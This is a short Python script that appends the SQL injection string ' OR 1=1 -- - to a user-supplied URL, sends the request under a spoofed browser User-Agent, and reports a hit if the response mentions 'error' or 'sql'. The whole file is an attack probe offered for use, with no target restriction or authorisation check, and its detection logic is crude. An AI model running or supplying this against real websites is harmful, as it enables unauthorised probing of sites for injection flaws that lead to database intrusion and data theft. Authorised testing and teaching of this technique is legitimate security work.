import requests
url = input("Enter URL: ")
headers = {'User-Agent': 'Mozilla/5.0'}
payload = "' OR 1=1 -- -"
req = requests.get(url + payload, headers=headers)
if "error" in req.text.lower() or "sql" in req.text.lower():
    print("[+] SQLi detected!")
else:
    print("[-] No SQLi detected")
